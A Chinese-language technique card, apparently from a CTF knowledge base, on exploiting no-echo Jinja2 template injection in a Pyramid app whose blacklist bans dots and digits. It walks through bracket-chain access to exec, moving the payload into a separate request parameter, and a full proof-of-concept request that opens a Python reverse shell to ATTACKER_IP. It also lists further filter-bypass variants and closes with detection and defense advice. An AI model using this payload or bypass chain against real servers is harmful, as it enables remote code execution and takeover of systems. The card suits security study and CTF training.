---
id: web-python-ssti-noecho-dot-banned-request-params-exec-reverse-shell
title: 无回显 SSTI 且点号被黑名单禁用：用中括号链取 `__globals__`/`__builtins__`，再从另一个请求参数取 exec 载荷反弹 shell
type: scenario
domain: web
path: web/python/ssti
technique: ssti-noecho-bracket-access-request-params-exec
aliases:
- 无回显 SSTI
- 点号被禁 SSTI
- 中括号绕过点号过滤
- request params 传参 SSTI
- Pyramid Jinja2 SSTI
- Ez_Gallery
tags:
- ssti
- jinja2
- python
- pyramid
- blacklist-bypass
- no-echo
- reverse-shell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:51:23+08:00'
  notes: 已对照原文核对；Pyramid 视图源码、黑名单正则（.*\..*、.*[0-9].*、length/count/soft/%）与 payload 均与正文一致，payload 不含点号与数字、载荷走 shell 参数成立；本次核对未读取图片，反弹 shell 是否成功仅见截图，未复跑
---

## 一句话结论

SSTI 被 WAF 按 `.*\..*`（禁止任何点号）、`.*[0-9].*`（禁止数字）、`length`/`count` 等特征过滤，而且模板渲染结果不回显（只返回 `success`/`error`）时，仍然可以打通：用中括号链 `lipsum['__globals__']['__builtins__']['exec']` 完全避开点号，再让 exec 的载荷从**另一个请求参数**里取（`request['params']['shell']`），这样模板本体不含数字与命令关键字，一次请求即可反弹 shell。

## 原理

- **点号不是必须的**：Jinja2 里 `obj.attr` 与 `obj['attr']` 都能取属性/键（`[]` 先走 `getitem`，失败回退 `getattr`）。黑名单禁 `.` 只挡掉了语法糖，`lipsum['__globals__']['__builtins__']['exec']` 等价于 `lipsum.__globals__.__builtins__.exec`，而且链上全是字符串键，不产生点号。
- **为什么选 `lipsum`**：它是 Jinja2 内置模板全局函数，`__globals__` 指向其定义模块的 globals，其中必然有 `__builtins__`，于是拿到 `exec`/`eval` 这类任意代码执行原语；同理可用 `cycler`、`joiner`、`namespace`、`url_for`、`get_flashed_messages`。
- **无回显也能确认执行**：渲染结果只用来判断模板是否抛异常（`success`/`error`），真正的输出不走页面——所以载荷必须自己产生带外效果（反弹 shell、写文件、发起 HTTP 请求）。原文用 Python 反弹 shell。
- **把载荷放到另一个参数里**：黑名单会扫描整个 `shellcmd` 值，若把 `import socket,subprocess,os` 这种带数字/关键字的代码写进模板，必然命中 `.*[0-9].*`（反弹 shell 里有端口号）等规则。用 `request['params']['shell']`（Pyramid 中 `request.params` 合并了 GET/POST 参数）在**渲染时**取值，模板本身只含键名，命中不了任何规则；而额外参数 `shell=...` 不在被检查的字段里。
- **中括号 + `request` 的组合价值**：`request['params']['shell']` 用中括号取，同样不产生点号，绕开了「不许出现 `.`」这条最容易卡死 payload 的规则。
- **对这个入口而言 `exec` 比 `eval` 好用**：直接执行多行 Python（`import`、`socket`、`dup2`、`subprocess.call`），不需要构造表达式返回值；换行用 `%0a` 传入即可。

## 触发条件

- 用户输入被当作 Jinja2 模板源码渲染（`jinja2.Environment(loader=BaseLoader()).from_string(expression).render(...)`），且传入的上下文里含 `request` 之类的对象。
- 黑名单只做字符串/正则匹配（禁 `.`、数字、`length`、`count`、`%` 等），不做语法解析，也没有禁用 `[`、`]`、`'`、`exec`。
- 渲染结果不回显也无所谓，因为载荷以带外方式产生效果；目标能主动外连到攻击者监听端口。
- 目标 Python 环境允许 `socket`/`subprocess`（未做 syscall 层面的限制）。

## 利用步骤

1. 确认注入点与过滤规则：审计到 `from_string(...).render({"request": request})`；注意黑名单 `.*\..*`（禁点号）、`.*[0-9].*`（禁数字）、`.*length.*`、`.*count.*`、`.*soft.*`、`.*%.*`。
2. 先验证表达式求值：提交 `{{lipsum}}` 类 payload，页面返回 `success` 说明模板渲染成功、`error` 说明语法/异常。
3. 用中括号链取 exec：`{{lipsum['__globals__']['__builtins__']['exec'](...)}}`，确认 `[]` 未被拦。
4. 把要执行的代码放到独立参数 `shell` 里，模板用 `request['params']['shell']` 取值，整条 payload 不含点号与数字。
5. 监听端口后发送请求，收到回连即成功。
6. 进一步：若 `exec` 被拦（关键字黑名单更严），改用 `['__builtins__']['__import__']('os')['system'](...)` 或用 `chr()` 拼关键字；若 `request` 不在上下文里，退回 `lipsum['__globals__']` 直接构造命令执行。

## PoC

```text
GET /shell?shellcmd={{lipsum['__globals__']['__builtins__']['exec'](request['params']['shell'])}}&shell=import socket,subprocess,os%0as=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0as.connect(("ATTACKER_IP",2333))%0aos.dup2(s.fileno(),0)%0aos.dup2(s.fileno(),1)%0aos.dup2(s.fileno(),2)%0ap=subprocess.call(["/bin/sh","-i"]) HTTP/1.1
Host: target
```

```text
# 关键点：
# 1) shellcmd 里没有 "."（点号被禁）、没有数字（数字被禁）
# 2) 端口号与 import 语句都在 shell 参数里，不在被扫描的 shellcmd 中
# 3) 模板只返回 success/error，结果靠反连带回
```

原文该题目为 Pyramid 应用（`config.add_route('shell', '/shell')` + `jinja2.BaseLoader()`），`/shell` 路由需要 `admin` 会话，账号来自弱口令（`admin/123456`）与验证码校验缺失。

## 变体与关联

- **取原语的其他入口**：`cycler`/`joiner`/`namespace`/`url_for['__globals__']`、`request['application']['__globals__']`、`self['__init__']['__globals__']`；被禁 `__globals__` 字面量时用 `['\x5f\x5fglobals\x5f\x5f']` 或 `|attr(...)`。
- **无回显的其他确认方式**：写文件到 Web 目录再访问、DNS 外带、延时盲打（`sleep` 变体）、错误回显差异。
- **参数拆分变体**：`request['args']`（Flask）、`request['form']`、`request['GET']`/`request['POST']`（其他框架），或在模板里用 `{% set %}` 拼接字符串以避开黑名单。
- 关联（同题不同解法，已对比后仍单独成卡）：`web-python-ssti-pyramid-request-response-callback-echo` 解决同一处「渲染结果被丢掉」的问题，但它走的是 `add_response_callback` 把命令输出改回响应体，**不涉及黑名单**（该卡备注也说明禁数字/`length`/`count` 的规则未在卡内体现）；本卡处理的是「点号与数字都被禁、且不打算要回显」的场景，靠中括号链 + 参数拆分 + 反弹 shell，触发约束与 PoC 均不同。其余关联：「十六进制下划线 + attr + request.args 拆分」卡（同类参数拆分，但那处禁的是关键字而非点号）、「无回显 SSTI 写 flag 进源码」卡（同类无回显，靠写文件回读）、`getattr`/`chr` 黑名单绕过卡。
- 边界：黑名单若扩展到禁 `[`、`]`、`_`、`exec`，本链需换 `|attr` 与十六进制转义；上下文未注入 `request` 时参数拆分失效；目标禁止外连时只能改用写文件/延时带外。

## 检测与防御

- 检测：请求参数中出现 `{{`/`{%`、`__globals__`、`__builtins__`、`exec`/`eval`、中括号链、`lipsum`/`cycler`；同一请求里出现「模板片段 + 长 Python 代码」两个参数（参数拆分的典型特征）；Web 进程产生异常外连（`/bin/sh`、socket 连接）。
- 防御：不要把用户输入送进模板引擎（用静态模板 + 传值）；必须动态渲染时用沙箱环境（`jinja2.sandbox.SandboxedEnvironment`）并禁止访问 dunder 属性；黑名单不可靠，应改为白名单表达式集合；模板上下文不要暴露 `request`、`config`、`self` 等高价值对象；限制 Web 进程外连并监控异常出站。
